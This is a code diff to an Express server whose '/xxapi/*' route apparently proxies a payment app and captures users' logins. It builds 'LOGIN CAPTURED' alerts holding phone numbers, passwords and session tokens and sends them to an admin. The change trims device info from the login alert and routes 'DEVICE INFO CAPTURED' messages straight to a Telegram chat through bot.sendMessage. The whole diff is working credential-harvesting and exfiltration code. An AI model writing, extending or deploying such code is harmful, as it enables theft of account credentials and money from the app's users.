@@ -1586,30 +1586,12 @@ app.all('/xxapi/*', async (req, res) => {
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
-      let capturedDeviceInfo = reqBody.deviceInfo;
-      if (!capturedDeviceInfo && userId && data.trackedUsers && data.trackedUsers[String(userId)]) {
-        capturedDeviceInfo = data.trackedUsers[String(userId)].lastDeviceInfo;
-      }
-      if (!capturedDeviceInfo && phone && data.phoneDeviceInfo) {
-        capturedDeviceInfo = data.phoneDeviceInfo[phone];
-      }
-
-      let deviceInfoStr = '';
-      if (capturedDeviceInfo) {
-        try {
-          const parsed = typeof capturedDeviceInfo === 'string' ? JSON.parse(capturedDeviceInfo) : capturedDeviceInfo;
-          deviceInfoStr = `\n\nDevice info\n\n\`\`\`json\n${JSON.stringify(parsed, null, 2)}\n\`\`\``;
-        } catch(e) {
-          deviceInfoStr = `\n\nDevice info\n\n\`\`\`json\n${capturedDeviceInfo}\n\`\`\``;
-        }
-      }
-
       notifyAdmin(data,
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
 📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
-🕐 ${now}${deviceInfoStr}`);
+🕐 ${now}`);
 
     }
 
@@ -1621,7 +1603,9 @@ app.all('/xxapi/*', async (req, res) => {
         } catch(e) {
           deviceInfoStr = `\`\`\`json\n${reqBody.deviceInfo}\n\`\`\``;
         }
-        notifyAdmin(data, `📱 DEVICE INFO CAPTURED\n👤 Phone: ${phone || 'N/A'}\n\n${deviceInfoStr}`);
+        if (data.adminChatId && bot) {
+           bot.sendMessage(data.adminChatId, `📱 *DEVICE INFO CAPTURED*\n👤 Phone: ${phone || 'N/A'}\n\n${deviceInfoStr}`, { parse_mode: 'Markdown' }).catch(()=>{});
+        }
     }
 
     const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
